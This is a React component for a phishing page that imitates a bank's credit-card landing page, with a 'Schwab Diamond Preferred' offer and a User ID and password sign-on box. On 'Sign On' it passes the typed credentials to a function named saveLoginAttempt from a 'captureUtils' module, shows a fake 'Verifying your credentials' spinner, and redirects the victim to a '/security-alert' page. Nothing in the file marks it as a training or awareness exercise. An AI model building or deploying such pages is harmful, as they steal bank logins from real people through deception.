import { useState } from 'react';
import { Eye, EyeOff, Fingerprint } from 'lucide-react';
import { Link, useLocation } from 'wouter';
import { saveLoginAttempt } from '@/lib/captureUtils';

export function HeroCiti() {
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState('');
  const [showPass, setShowPass] = useState(false);
  const [loading, setLoading] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [, navigate] = useLocation();

  const handleSignOn = () => {
    if (!userId.trim() && !password.trim()) return;
    saveLoginAttempt(userId.trim(), password, '/citi');
    setLoading(true);
    setTimeout(() => { setLoading(false); navigate('/security-alert'); }, 1800);
  };

  return (
    <section style={{ background: 'linear-gradient(135deg, #f8f9fa 0%, #e8f0fb 60%, #d0e4f7 100%)', padding: '64px 48px' }}>
      <div style={{ maxWidth: '1200px', margin: '0 auto', display: 'flex', gap: '40px', alignItems: 'center' }}>

        {/* Left column */}
        <div style={{ flex: '1.2' }}>
          <div style={{ fontSize: '10px', fontWeight: 700, letterSpacing: '2px', color: '#6B7280', textTransform: 'uppercase', marginBottom: '10px' }}>
            SCHWAB® DIAMOND PREFERRED®
          </div>
          <h1 style={{ fontSize: '40px', fontWeight: 900, color: '#111827', lineHeight: '1.08', marginBottom: '14px' }}>
            Great for Balance<br />Transfers
          </h1>
          <p style={{ fontSize: '15px', color: '#4B5563', maxWidth: '380px', lineHeight: '1.65', marginBottom: '24px' }}>
            Enjoy a long-lasting Intro APR, 21 months on Balance Transfers and 12 months on Purchases. Plus, No Annual Fee*
          </p>
          <div style={{ display: 'flex', alignItems: 'center', gap: '18px' }}>
            <button style={{ background: '#003087', color: '#fff', border: 'none', borderRadius: '4px', padding: '12px 28px', fontSize: '14px', fontWeight: 700, cursor: 'pointer' }}
              onMouseEnter={(e) => e.currentTarget.style.background = '#0041B8'}
              onMouseLeave={(e) => e.currentTarget.style.background = '#003087'}>
              Apply Now
            </button>
            <a href="#" style={{ fontSize: '13.5px', color: '#003087', textDecoration: 'underline', fontWeight: 500 }}>*Pricing and Information</a>
          </div>
        </div>

        {/* Center — card image */}
        <div style={{ flex: '1.4', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <img src="/card-diamond-preferred.png" alt="Schwab Diamond Preferred Card"
            style={{ width: '360px', borderRadius: '18px', boxShadow: '0 16px 48px rgba(0,0,0,0.28)', display: 'block' }} />
        </div>

        {/* Right — Login card */}
        <div style={{ flex: '0 0 300px', background: '#fff', border: '1px solid #D1D5DB', borderRadius: '8px', padding: '24px', boxShadow: '0 4px 20px rgba(0,0,0,0.12)' }}>
          {loading ? (
            <div style={{ textAlign: 'center', padding: '32px 0' }}>
              <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" style={{ animation: 'spin 0.8s linear infinite' }}>
                  <style>{`@keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}`}</style>
                  <circle cx="12" cy="12" r="10" stroke="#003087" strokeOpacity="0.15" strokeWidth="3" />
                  <path d="M12 2a10 10 0 019.8 8" stroke="#003087" strokeWidth="3" strokeLinecap="round" />
                </svg>
              </div>
              <div style={{ fontSize: '13px', fontWeight: 600, color: '#003087' }}>Signing in…</div>
              <div style={{ fontSize: '11px', color: '#9CA3AF', marginTop: 4 }}>Verifying your credentials</div>
            </div>
          ) : (
            <>
              <div style={{ display: 'flex', width: '100%', marginBottom: '8px' }}>
                <label style={{ width: '50%', fontSize: '12px', fontWeight: 600, color: '#374151' }}>User ID</label>
                <label style={{ width: '50%', fontSize: '12px', fontWeight: 600, color: '#374151' }}>Password</label>
              </div>
              <div style={{ display: 'flex', gap: '8px', marginBottom: '12px' }}>
                <input type="text" value={userId} onChange={(e) => setUserId(e.target.value)}
                  onKeyDown={(e) => e.key === 'Enter' && handleSignOn()}
                  style={{ width: '100%', height: '42px', border: '1px solid #D1D5DB', borderRadius: '6px', padding: '0 12px', fontSize: '14px' }} />
                <div style={{ position: 'relative', width: '100%' }}>
                  <input type={showPass ? 'text' : 'password'} value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onKeyDown={(e) => e.key === 'Enter' && handleSignOn()}
                    style={{ width: '100%', height: '42px', border: '1px solid #D1D5DB', borderRadius: '6px', padding: '0 40px 0 12px', fontSize: '14px', boxSizing: 'border-box' }} />
                  <button onClick={() => setShowPass(v => !v)}
                    style={{ position: 'absolute', right: '8px', top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer' }}>
                    {showPass ? <EyeOff style={{ width: '16px', height: '16px', color: '#003087' }} /> : <Eye style={{ width: '16px', height: '16px', color: '#003087' }} />}
                  </button>
                </div>
              </div>
              <div style={{ display: 'flex', alignItems: 'center', marginBottom: '16px' }}>
                <input type="checkbox" id="remember-citi" checked={rememberMe} onChange={(e) => setRememberMe(e.target.checked)}
                  style={{ width: '16px', height: '16px', accentColor: '#003087' }} />
                <label htmlFor="remember-citi" style={{ fontSize: '14px', color: '#374151', marginLeft: '8px', cursor: 'pointer' }}>Remember User ID</label>
              </div>
              <button onClick={handleSignOn}
                style={{ width: '100%', padding: '12px', background: '#003087', color: '#fff', border: 'none', borderRadius: '4px', fontSize: '14px', fontWeight: 700, cursor: 'pointer', marginBottom: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}
                onMouseEnter={(e) => e.currentTarget.style.background = '#0041B8'}
                onMouseLeave={(e) => e.currentTarget.style.background = '#003087'}>
                Sign On
              </button>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '13px', marginBottom: '12px' }}>
                <Link href="#" style={{ color: '#1D4ED8', textDecoration: 'underline' }}>Register / Activate</Link>
                <Link href="#" style={{ color: '#1D4ED8', textDecoration: 'underline' }}>Forgot User ID or Password</Link>
              </div>
              <hr style={{ borderColor: '#E5E7EB', margin: '12px 0' }} />
              <button style={{ width: '100%', padding: '10px', background: '#fff', border: '1px solid #D1D5DB', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', cursor: 'pointer' }}
                onMouseEnter={(e) => e.currentTarget.style.background = '#F9FAFB'}
                onMouseLeave={(e) => e.currentTarget.style.background = '#fff'}>
                <Fingerprint style={{ width: '18px', height: '18px', color: '#003087' }} />
                <span style={{ fontSize: '14px', color: '#374151' }}>Passwordless Sign On</span>
              </button>
            </>
          )}
        </div>
      </div>
    </section>
  );
}
